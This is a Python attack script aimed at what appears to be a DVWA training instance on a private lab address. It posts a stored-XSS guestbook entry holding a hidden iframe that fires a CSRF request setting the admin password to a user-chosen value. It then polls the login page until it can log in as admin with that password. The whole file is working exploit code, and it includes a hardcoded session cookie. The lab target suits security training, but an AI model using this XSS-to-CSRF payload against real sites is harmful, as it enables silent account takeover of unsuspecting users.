'''
import requests
from bs4 import BeautifulSoup as bs 
from time import sleep

a = input('Insert Password : ')

URL = "http://10.0.2.15:8080/vulnerabilities/xss_s/"
        
cookie={
        "PHPSESSID":"mtmr8lk10mfbt9ibj827fvlrh0",
        "security":"low"
        }

clear = {"txtName":"",
        "mtxMessage":"",
        "btnClear":"Clear+Guestbook"
        }

datas = {
        "txtName":"CSRF",
        "mtxMessage":"<iframe src='http://10.0.2.15:8080/vulnerabilities/csrf/?password_new="+str(a)+"&password_conf="+str(a)+"&Change=Change#' width=0 height=0>",
        "btnSign":"Sign+Guestbook"
        }

URL2 = "http://10.0.2.15:8080/login.php"

session1 = requests.Session()

session2 = requests.Session()

req=session1.post(URL,cookies=cookie,data=clear)

req2=session2.post(URL,cookies=cookie,data=datas)

req3=session2.get(URL,cookies=cookie)

if(req3.text.find("<iframe")!=-1):
    print("\n\n")
    print("Update Success")
    print("\n\n")
    
    session3 = requests.Session()
    
    while(1):
        req4=session3.get(URL2,cookies=cookie)
    
        soup=bs(req4.text,"html.parser")
        token=soup.find('input',{'name':'user_token'})

        login = {
                "username":"admin",
                "password":str(a),
                "Login":"Login",
                "user_token":token['value'] 
                }
    
        req5=session3.post(URL2,cookies=cookie,data=login)

        if(req5.text.find("login_logo.png")==-1):
            print("\n\n")
            print("Password Change Success! Password is "+str(a))
            print("\n\n")
            exit(0);

        else:
            print("Password Change Fail")
            sleep(10)

else:
    print("Update Fail")

'''
